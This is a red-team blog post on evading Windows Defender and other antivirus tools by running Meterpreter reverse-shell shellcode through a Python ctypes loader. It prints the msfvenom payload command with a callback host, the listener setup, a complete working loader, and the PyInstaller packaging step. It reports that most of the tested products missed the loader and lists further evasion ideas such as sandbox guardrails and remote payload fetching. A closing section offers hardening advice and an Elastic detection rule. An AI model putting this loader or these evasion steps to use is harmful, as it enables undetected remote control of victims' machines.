@@ -1,0 +1,185 @@
+# https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html
+
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<body>
+<!-- Subtle Back to ToC link at the top -->
+<p style="text-align: left; font-size: 14px; margin-bottom: 10px;">
+    <a href="https://infosecfacts.github.io/index.html" style="color: #666; text-decoration: none;">← Back to Table of Contents</a>
+</p>
+
+
+<p><small>2025-05-17</small> <img src="https://infosecfacts.github.io/content/img/python-defender-banner2.png"></p>
+<h2 id="introduction-and-context">1. Introduction and Context</h2>
+<p>This is the first blog post in a series where we will develop and improve a Python shellcode loader. We will explore possible defenses against it and possible ways around them.</p>
+<h3 id="complex-shellcode-execution-methods-not-always-necessary">Complex Shellcode Execution Methods not always necessary</h3>
+<p>Running shellcode from any of the major open-source C2 frameworks has become increasingly difficult in recent years. AVs and EDRs are much more advanced than they were 10 years ago, with capabilities that go beyond fixed signature checks, behavior-based heuristics now play a major role. In my daily job as a red team consultant, I frequently face blue teams of varying skill levels, detection capabilities and infrastructure, so creative solutions for bypassing their defenses are a must in order to run my desired tools.</p>
+<p>C is my preferred language for malware and offensive tool creation, but I’m also a lazy hacker, fancy evasion techniques like <a href="https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/" target="_blank">early-cascade-injection</a> or <a href="https://github.com/CCob/ThreadlessInject" target="_blank">threadless-injection</a> are great when needed, but often, they’re not required when facing a client with an immature blue team or a client without a proper EDR.</p>
+<p>Equally important, there’s always a risk of triggering an alert despite thorough testing and implemented evasion techniques. A motivated blue teamer reversing your implants can easily render hours of development useless. Sometimes, it’s better to use “cheaper” tools, if they get the job done.</p>
+<h3 id="scope-of-this-blog-post">Scope of this Blog Post</h3>
+<p>In this blog post, I’ll explain a simple technique to run <a href="https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html" target="_blank">meterpreter</a> shellcode while evading Windows Defender and other AVs. We will explore how defenders can setup detections against this type of attack and explore possible mitigations.**</p>
+<p>This post will not touch techniques used to deliver malware to endpoints, basics about C2 frameworks, shellcode or general redteam methodology.</p>
+<p>So who is this blog post for? For infosec beginners and enthusiasts looking to broaden their knowledge on basic AV evasion and C2 framework usage. Defenders trying to improve their offensive knowledge to develop better detection use-cases or also seasoned infosec professionals looking for some inspiration for the next client project.</p>
+<h2 id="payload-development-execution-evasion">2. Payload Development, Execution &amp; Evasion</h2>
+<h3 id="meterpreter-shellcode-is-generated-as-python-buffer">Meterpreter Shellcode is Generated as Python Buffer</h3>
+<p>The Meterpreter shellcode was created as follows and uses mostly default settings. <code>LURI</code> and <code>HTTPUSERAGENT</code> were specified to pass through my <a href="https://www.packtpub.com/en-de/learning/how-to-tutorials/obfuscating-command-and-control-c2-servers-securely-with-redirectors-tutorial" target="_blank">redirector</a> and reach the Metasploit multi/handler.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb1-1" aria-hidden="true"></a><span class="ex">msfvenom</span> -p windows/x64/meterpreter_reverse_https <span class="kw">\</span></span>
+<span id="cb1-2"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb1-2" aria-hidden="true"></a><span class="va">LHOST=</span>example.com <span class="kw">\</span></span>
+<span id="cb1-3"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb1-3" aria-hidden="true"></a><span class="va">LPORT=</span>443 <span class="kw">\</span></span>
+<span id="cb1-4"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb1-4" aria-hidden="true"></a><span class="va">LURI=</span>/api/v1/data/ <span class="kw">\</span></span>
+<span id="cb1-5"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb1-5" aria-hidden="true"></a><span class="va">HTTPUSERAGENT=</span><span class="st">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.3240.76"</span> <span class="kw">\</span></span>
+<span id="cb1-6"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb1-6" aria-hidden="true"></a><span class="ex">-f</span> python</span></code></pre></div>
+<p>The <code>-f python</code> generates the shellcode as hex string for python. If we wanted to use the shellcode in C we would just change it to <code>-f C</code>.</p>
+<p>We configure a listener that does not automatically load the stdapi and does not execute the sysinfo command on startup. This helps to make the shellcode less likely to be detected when executed.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb2-1" aria-hidden="true"></a><span class="ex">use</span> multi/handler</span>
+<span id="cb2-2"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb2-2" aria-hidden="true"></a><span class="kw">set</span> <span class="ex">payload</span> windows/x64/meterpreter_reverse_http</span>
+<span id="cb2-3"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb2-3" aria-hidden="true"></a><span class="kw">set</span> <span class="ex">luri</span> /api/v1/data/</span>
+<span id="cb2-4"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb2-4" aria-hidden="true"></a><span class="kw">set</span> <span class="ex">lhost</span> 0.0.0.0</span>
+<span id="cb2-5"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb2-5" aria-hidden="true"></a><span class="kw">set</span> <span class="ex">autoloadstdapi</span> false</span>
+<span id="cb2-6"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb2-6" aria-hidden="true"></a><span class="kw">set</span> <span class="ex">autosysteminfo</span> false</span>
+<span id="cb2-7"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb2-7" aria-hidden="true"></a><span class="kw">set</span> <span class="ex">exitonsession</span> false</span>
+<span id="cb2-8"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb2-8" aria-hidden="true"></a><span class="ex">run</span> -j</span></code></pre></div>
+<h3 id="finding-a-simple-shellcode-loader-to-get-started">Finding a Simple Shellcode Loader to Get Started</h3>
+<p>When starting this I wanted to use the most simplistic shellcode loader I could find. Nothing special, just allocate memory in the current process, write shellcode into allocated memory and execute.<br> A quick Google search led me to <a href="https://gist.github.com/securitytube/c956348435cc90b8e1f7" target="_blank">this</a> loader code written over 11 years ago, perfect to get started.</p>
+<p><img src="https://infosecfacts.github.io/content/img/github-loader.png"> <small>Screenshot of the DllMainThread.c loader from Github</small></p>
+<h3 id="initial-test-triggered-a-detection">Initial Test Triggered a Detection</h3>
+<p>I compiled and executed the basic loader as a DLL using rundll32.exe with my unmodified meterpreter shellcode. As expected, Windows Defender immediately flagged and blocked the execution. This confirms the need for evasion improvements before the shellcode can be used in a red team engagement.</p>
+<p><img src="https://infosecfacts.github.io/content/img/defender-alert-basicloader1.png"> <small>Execution was detected prevented by Defender</small> <img src="https://infosecfacts.github.io/content/img/defender-alert-basicloader2.png"> <small>Defender detected “HackTool:Win32/Meterpreter.A!dll”</small></p>
+<h3 id="python-gives-shellcode-a-way-around-the-av">Python Gives Shellcode a Way Around the AV</h3>
+<p>By 2025, most well-known methods for executing shellcode on Windows are heavily signatured and well detected. When looking for easy ways to bypass those detections, many malware developers have turned to a technique called BYOE or Bring-your-own-environment. Basically, the idea is to bring an environment the detection engine is not used to or has only limited visibility into. Examples include <a href="https://github.com/SygniaLabs/Qemuno" target="_blank">Qemu</a>, <a href="https://gist.github.com/whokilleddb/d4dd378a5bae12c0c13fec780f4deb54" target="_blank">NodeJS</a> or even <a href="https://gist.github.com/Wra7h/573df0297b9f15ce420898ce4f07a3da" target="_blank">Matlab</a>. I chose Python since I feel comfortable writing Python code and I would like to have quick results.</p>
+<p><img src="https://infosecfacts.github.io/content/img/python-meme.png"></p>
+<p>I took the loader code I found on Github above and translated it into Python with a little help from ChatGPT. The <a href="https://docs.python.org/3/library/ctypes.html" target="_blank">ctypes library</a> allows us to interact with the same Win32 API endpoints as if we were using C.</p>
+<h4 id="translated-python-code">Translated Python Code</h4>
+<div class="sourceCode" id="cb3"><pre class="sourceCode py"><code class="sourceCode python"><span id="cb3-1"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-1" aria-hidden="true"></a><span class="im">import</span> ctypes</span>
+<span id="cb3-2"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-2" aria-hidden="true"></a><span class="im">import</span> threading</span>
+<span id="cb3-3"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-3" aria-hidden="true"></a><span class="im">from</span> ctypes <span class="im">import</span> wintypes</span>
+<span id="cb3-4"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-4" aria-hidden="true"></a></span>
+<span id="cb3-5"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-5" aria-hidden="true"></a>MEM_COMMIT <span class="op">=</span> <span class="bn">0x1000</span></span>
+<span id="cb3-6"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-6" aria-hidden="true"></a>PAGE_EXECUTE_READWRITE <span class="op">=</span> <span class="bn">0x40</span></span>
+<span id="cb3-7"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-7" aria-hidden="true"></a></span>
+<span id="cb3-8"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-8" aria-hidden="true"></a>buf <span class="op">=</span>  b<span class="st">""</span></span>
+<span id="cb3-9"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-9" aria-hidden="true"></a>buf <span class="op">+=</span> b<span class="st">"</span><span class="ch">\x4d\x5a\x41\x52\x55\x48\x89\xe5\x48\x83\xec\x20</span><span class="st">"</span></span>
+<span id="cb3-10"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-10" aria-hidden="true"></a>[...]</span>
+<span id="cb3-11"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-11" aria-hidden="true"></a>buf <span class="op">+=</span> b<span class="st">"</span><span class="ch">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="st">"</span></span>
+<span id="cb3-12"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-12" aria-hidden="true"></a>buf <span class="op">+=</span> b<span class="st">"</span><span class="ch">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="st">"</span></span>
+<span id="cb3-13"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-13" aria-hidden="true"></a>buf <span class="op">+=</span> b<span class="st">"</span><span class="ch">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="st">"</span></span>
+<span id="cb3-14"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-14" aria-hidden="true"></a>buf <span class="op">+=</span> b<span class="st">"</span><span class="ch">\xff\xff\xff\xff</span><span class="st">"</span></span>
+<span id="cb3-15"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-15" aria-hidden="true"></a></span>
+<span id="cb3-16"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-16" aria-hidden="true"></a><span class="co"># Define functions from kernerl32.dll</span></span>
+<span id="cb3-17"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-17" aria-hidden="true"></a>kernel32 <span class="op">=</span> ctypes.windll.kernel32</span>
+<span id="cb3-18"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-18" aria-hidden="true"></a>kernel32.GetCurrentProcess.restype <span class="op">=</span> wintypes.HANDLE</span>
+<span id="cb3-19"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-19" aria-hidden="true"></a>kernel32.VirtualAllocEx.argtypes <span class="op">=</span> [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]</span>
+<span id="cb3-20"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-20" aria-hidden="true"></a>kernel32.VirtualAllocEx.restype <span class="op">=</span> wintypes.LPVOID</span>
+<span id="cb3-21"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-21" aria-hidden="true"></a>kernel32.WriteProcessMemory.argtypes <span class="op">=</span> [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]</span>
+<span id="cb3-22"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-22" aria-hidden="true"></a>kernel32.WriteProcessMemory.restype <span class="op">=</span> wintypes.BOOL</span>
+<span id="cb3-23"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-23" aria-hidden="true"></a></span>
+<span id="cb3-24"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-24" aria-hidden="true"></a><span class="kw">def</span> ThreadFunction(lpParameter):</span>
+<span id="cb3-25"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-25" aria-hidden="true"></a>    current_process <span class="op">=</span> kernel32.GetCurrentProcess()</span>
+<span id="cb3-26"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-26" aria-hidden="true"></a></span>
+<span id="cb3-27"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-27" aria-hidden="true"></a>    <span class="co"># Allocate memory with `VirtualAllocEx`</span></span>
+<span id="cb3-28"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-28" aria-hidden="true"></a>    sc_memory <span class="op">=</span> kernel32.VirtualAllocEx(current_process, <span class="va">None</span>, <span class="bu">len</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE)</span>
+<span id="cb3-29"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-29" aria-hidden="true"></a>    bytes_written <span class="op">=</span> ctypes.c_size_t(<span class="dv">0</span>)</span>
+<span id="cb3-30"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-30" aria-hidden="true"></a></span>
+<span id="cb3-31"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-31" aria-hidden="true"></a>    <span class="co"># Copy raw shellcode with `WriteProcessMemory`</span></span>
+<span id="cb3-32"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-32" aria-hidden="true"></a>    kernel32.WriteProcessMemory(current_process, sc_memory,ctypes.c_char_p(buf),<span class="bu">len</span>(buf),ctypes.byref(bytes_written))</span>
+<span id="cb3-33"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-33" aria-hidden="true"></a></span>
+<span id="cb3-34"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-34" aria-hidden="true"></a>    <span class="co"># Execute shellcode in memory by casting the address to a function pointer with `CFUNCTYPE`</span></span>
+<span id="cb3-35"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-35" aria-hidden="true"></a>    shell_func <span class="op">=</span> ctypes.CFUNCTYPE(<span class="va">None</span>)(sc_memory)</span>
+<span id="cb3-36"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-36" aria-hidden="true"></a>    shell_func()</span>
+<span id="cb3-37"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-37" aria-hidden="true"></a></span>
+<span id="cb3-38"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-38" aria-hidden="true"></a>    <span class="cf">return</span> <span class="dv">1</span></span>
+<span id="cb3-39"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-39" aria-hidden="true"></a></span>
+<span id="cb3-40"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-40" aria-hidden="true"></a><span class="kw">def</span> Run():</span>
+<span id="cb3-41"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-41" aria-hidden="true"></a>    thread <span class="op">=</span> threading.Thread(target<span class="op">=</span>ThreadFunction, args<span class="op">=</span>(<span class="va">None</span>,))</span>
+<span id="cb3-42"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-42" aria-hidden="true"></a>    thread.start()</span>
+<span id="cb3-43"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-43" aria-hidden="true"></a></span>
+<span id="cb3-44"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-44" aria-hidden="true"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">"__main__"</span>:</span>
+<span id="cb3-45"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb3-45" aria-hidden="true"></a>    Run()</span></code></pre></div>
+<p>After embedding the previously generated shellcode as a hex string into the loader code, I uploaded the file to VirusTotal, and to my surprise, it came back completely clean.<br> <strong>For clarity, uploading payloads to VirusTotal is something I typically do not do and that I strongly advice against</strong>, since doing so makes the sample accessible to analysts who can download it generate detection rules for it.</p>
+<p><img src="https://infosecfacts.github.io/content/img/virustotal1.png"> <small>Static analysis of the python code containing the shellcode buffer raised no alerts in virustotal</small></p>
+<p>I executed the loader and immediately received a meterpreter session in my backend. The alert we previously encountered was gone despite executing the same piece of shellcode.</p>
+<p><video src="https://infosecfacts.github.io/content/img/python-loader-demo_fast.webm" controls=""><a href="https://infosecfacts.github.io/content/img/python-loader-demo_fast.webm">Video</a></video> <small>Demo: Executing the loader and running commands in the newly established meterpreter session</small></p>
+<p><img src="https://infosecfacts.github.io/content/img/borat-great-success.jpg"></p>
+<h3 id="detection-results-are-even-better-than-expected">Detection results are even better than expected</h3>
+<p>I packed the Python loader into an executable using <a href="https://pyinstaller.org/en/stable/" target="_blank">pyinstaller</a> and ran it through a quick test.</p>
+<p><small>Update (May 18, 2025): added pyinstaller and updated chart below. pyinstaller, not py2exe was used.</small></p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb4-1" aria-hidden="true"></a><span class="ex">python3</span> -m PyInstaller -F loader.py -i <span class="st">"icon.ico"</span> --noconsole</span></code></pre></div>
+<p>I used a mix of free antivirus products and one EDR.<br> For each security solution, I tested both the raw loader.py executed via python.exe and the packed loader.exe version generated with pyinstaller.<br> The results were surprising: <strong>only 1 out of 8 tools actually stopped the loader from running.</strong> Bitdefender was the only one that blocked it completely. The others either missed it entirely or only blocked the executable.</p>
+<p><img src="https://infosecfacts.github.io/content/img/detection-results.png"> <small>The table shows that python.exe+loader.py is only detected by Bitdefender</small></p>
+<p>This was unexpected. Based on how the loader works and the fact that py2exe leaves many artifacts in the binary, I anticipated a much worse outcome, full detection (all red) for the .exe version, and at least partial detection for running loader.py with python.exe.</p>
+<p><img src="https://infosecfacts.github.io/content/img/meterpreter-sessions.png"> <small>Lots of meterpreter sessions arrived. 127.0.0.1 is the source IP because the redirector is deployed on the same machine. This should be fixed by adding the X-Forwarded-for header in the redirecrtor config</small></p>
+<h2 id="limitations-detection-defensive-considerations">3. Limitations, Detection &amp; Defensive Considerations</h2>
+<h3 id="the-approach-comes-with-some-caveats">The Approach Comes with some Caveats</h3>
+<ul>
+<li><strong>Python is not installed by default on most Windows systems.</strong> This means it must be downloaded or dropped before execution. While this can be done using tools like WSH, PowerShell, or other <a href="https://lolbas-project.github.io/#" target="_blank">lolbins</a>, it adds complexity to the infection chain and increases the chances of detection.</li>
+<li><strong>Python code is easy to reverse-engineer.</strong> Being interpreted, Python scripts are readable and transparent to defenders. However, there are techniques available to obfuscate strings, pack the script, encrypt it, or pack it to a standalone executable.</li>
+<li><strong>Detection is straightforward with a properly configured EDR.</strong> Modern security solutions can monitor API calls, memory permissions, and Python behavior. This approach may evade basic Defender configurations, but it is unlikely to bypass well-tuned EDR environments.</li>
+<li><strong>Shellcode executes inside the current process</strong> (python.exe). From an OPSEC standpoint, this is not ideal. Any monitoring focused on Python will catch unusual memory activity or library loads, making this loader more suitable for short-lived or disposable access.</li>
+</ul>
+<h3 id="preventing-such-attacks-is-possible-but-requires-some-manual-adjustments">Preventing Such Attacks Is Possible but Requires Some Manual Adjustments</h3>
+<h4 id="policy-recommendations">Policy Recommendations</h4>
+<p>Bring-your-own-environment (BYOE) techniques can work in poorly secured environments, but they depend on weaknesses that basic hardening can block. The following strategies can help prevent or disrupt their use:</p>
+<ul>
+<li><strong>A properly configured EDR will detect this technique.</strong> Even basic in-memory execution via Python can be flagged based on suspicious API usage, memory permissions, or behavior from <code>python.exe</code>.</li>
+<li><strong>Application allowlisting is highly effective.</strong> Solutions like Windows Defender Application Control (<a href="https://learn.microsoft.com/en-us/hololens/windows-defender-application-control-wdac" target="_blank">WDAC</a>) can block unknown or unauthorized binaries — including interpreters like Python — from executing in the first place. This is especially useful if Python is not already deployed in your environment.</li>
+<li><strong>Consider disabling the Windows Store if it’s not needed.</strong> This limits the ability of attackers to install software like Python through legitimate but unnecessary channels, reducing the available surface for BYOE-style execution.</li>
+</ul>
+<h4 id="detection-implementing-a-basic-use-case-in-elastic-edr">Detection: Implementing a basic use-case in Elastic EDR</h4>
+<blockquote>
+<p>Edit: With Elastic ingesting Sysmon + ETW, this is well detected and does not need any additional rules.</p>
+</blockquote>
+<p><strong>Note:</strong> Many EDRs come with the following or some of the following use-cases pre-installed.</p>
+<p>In Elastic EDR’s default configuration, options are limited because ETW and Sysmon data are not ingested. However, with a creative approach, it is still possible to create a reliable detection rule for the loader with a low false positive rate.</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb5-1"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb5-1" aria-hidden="true"></a>(</span>
+<span id="cb5-2"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb5-2" aria-hidden="true"></a>    process.executable.text : <span class="ot">"\\users"</span></span>
+<span id="cb5-3"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb5-3" aria-hidden="true"></a>    <span class="kw">or</span></span>
+<span id="cb5-4"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb5-4" aria-hidden="true"></a>    process.executable.text: <span class="ot">"\\windows\\temp"</span></span>
+<span id="cb5-5"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb5-5" aria-hidden="true"></a>    ) <span class="kw">and</span></span>
+<span id="cb5-6"><a href="https://infosecfacts.github.io/content/Evading%20Defender%20with%20Python%20and%20Meterpreter%20Shellcode:%20Part%201.html#cb5-6" aria-hidden="true"></a>dll.name: <span class="ot">"_ctypes.pyd"</span></span></code></pre></div>
+<p>This rule checks for executables running from user-writable paths that load the _ctypes.pyd library. The filename is not included in the condition, as it can be easily changed. Signature checking for the Python binary (signed by “Python Software Foundation”) could be useful, but would exclude binaries created with py2exe or PyInstaller.</p>
+<p>The rule successfully detected the loader in both forms: as a compiled executable and as a script executed with python.exe. Alerts were generated in Elastic SIEM for both.</p>
+<p><img src="https://infosecfacts.github.io/content/img/python-loader-alerts.png"> <small>Screenshot of the alerts for our python loader in an elastic siem</small></p>
+<p>There is room for improvement. The shellcode may trigger additional behaviors like DNS resolution or network activity, which could be used to further refine detection. For now, this rule provides a solid starting point.</p>
+<hr>
+<h2 id="future-work-conclusion">4. Future Work &amp; Conclusion</h2>
+<h3 id="main-area-of-improvements-are-shellcode-delivery-and-the-technique-used-for-shellcode-execution">Main area of improvements are shellcode delivery and the technique used for shellcode execution</h3>
+<p>This loader is far from being perfect or stealthy in many ways. So let’s think about what could and should be improved. Some ideas: This loader works, but it is far from stealthy or production-ready. To make it more effective in real-world scenarios, we need to start thinking like defenders and work on improving both evasion and flexibility. Here are several ideas we will try to explore in the next blog post:</p>
+<ul>
+<li><strong>Encrypt the shellcode and decrypt it in memory.</strong> Avoid hardcoded, raw shellcode that can be trivially extracted from disk</li>
+<li><strong>Obfuscate or encrypt the loader itself.</strong> A multi-stage approach can help conceal shellcode execution capabilities from static analysis or reverse engineers</li>
+<li><strong>Fetch the shellcode at runtime.</strong> Loading payloads from remote sources avoids embedding anything suspicious directly in the loader. This also helps to keep the file entropy lower.</li>
+<li><strong>Implement basic guardrails to evade automated sandbox detection</strong>
+<ul>
+<li>Use the machine name or username as a key for shellcode decryption</li>
+<li>Set a specific trigger date to delay execution and avoid sandbox timeouts</li>
+<li>Check if the system is domain joined, sandboxes typically are not</li>
+<li>Visit <a href="https://evasions.checkpoint.com/" target="_blank">evasions.checkpoint.com</a> for more sandbox bypass ideas</li>
+</ul></li>
+<li><strong>Adopt more covert execution techniques.</strong> Instead of running the shellcode inside <code>python.exe</code>, consider injecting into a remote process to reduce the detection footprint</li>
+<li><strong>Evaluate packaging options carefully.</strong> Bundling the loader into an executable (e.g., with <code>py2exe</code> or <code>PyInstaller</code>) might simplify deployment, but these tools have historically triggered alerts</li>
+</ul>
+<h3 id="conclusion-and-way-ahead">Conclusion and way ahead</h3>
+<p>While the same execution technique caused alerts when implemented in C, running it in Python using the ctypes library, slipped past detections. Even in 2025, it is still relatively easy to build shellcode loaders and other offensive tooling that evade Windows Defender and other free AVs.</p>
+<p>This loader is only detected and stopped by Bitdefender of all the solutions I tested against. Likely there are various non-free EDRs that detect this by hooking the right API calls or checking the right kernel callbacks but those were not tested here.</p>
+<p>On the defensive side, we developed a custom detection rule for Elastic EDR which did not pick it up before and found a reliable way to catch this behavior, proving that even open-source tools can keep up with BYOE techniques when tuned properly.</p>
+<p>In the next post, we will try to implement some of the improvements listed above and see how much we can improve the loader.</p>
+<p>Cheers 🫡</p>
